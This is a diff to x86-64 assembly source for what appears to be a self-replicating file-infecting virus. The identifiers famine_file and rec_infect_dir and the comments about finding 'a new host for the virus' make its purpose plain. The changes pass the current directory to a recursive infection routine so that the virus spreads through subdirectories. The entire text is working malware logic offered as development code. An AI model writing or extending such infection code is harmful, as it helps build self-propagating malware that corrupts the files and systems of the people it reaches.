@@ -505,7 +505,6 @@ list_files:
 			maybe_reg_file:
 			cmp byte[r9 + 18], 	REGULAR_FILE ; [r9 +18] is file type
 			jne skip_file
-			;later add here directory handle for recursive infection
 			mov rdi, rsi; pass fname as arg
 			call famine_file ; void famine_file(char * fname);
 			skip_file: 
@@ -535,7 +534,10 @@ handle_dir:
 	jne hd_parent
 	mov rax, 80
 	syscall;chdir(fname);
+	push 0x0000002e; our target directory here "."
+	lea rdi, [rsp]	
 	call rec_infect_dir
+	add rsp, 8
 	;infect directory here
 	jmp exit_prog
 	hd_parent:
@@ -608,8 +610,9 @@ rec_infect_dir:
 	rec_read_exit:
 	add rsp, 4
 	add rsp,1024
-		
+
 	push 0x0000002e; our target directory here "."
+	lea rdi, [rsp]
 	call list_files; RECURSIVNESS HERE, if we couldn't find a new host for the virus... Restart the process starting at current directory
 	add rsp, 8
 retn
